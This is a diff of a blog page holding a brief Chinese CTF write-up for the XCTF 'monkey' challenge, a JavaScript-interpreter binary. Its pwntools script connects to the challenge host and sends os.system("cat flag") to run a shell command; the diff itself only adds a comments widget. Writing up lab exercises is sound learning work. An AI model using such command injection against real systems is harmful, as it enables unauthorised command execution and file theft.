@@ -7,6 +7,6 @@
 <a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>XCTF-monkey-WP</h1><div class=meta>Posted on Nov 12, 2020</div></div><section class=body><p>这道题拿到的时候发现有20多兆，但是看名字像js的解释器，启动程序之后发现就是，所以直接连接cat flag就行了...</p><pre class=wp-block-code><code>from pwn import *
 sh = remote("220.249.52.133","****")
 sh.sendline("os.system(\"cat flag\")")
-sh.interactive()</code></pre><p>开拓了一下视野，碰到较大的文件也不应该害怕。</p></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+sh.interactive()</code></pre><p>开拓了一下视野，碰到较大的文件也不应该害怕。</p></section><div class=post-tags></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
 <a class=border></a><a class=soc href=https://twitter.com/jchu95495236 rel=me title=Twitter><i data-feather=twitter></i></a>
 <a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
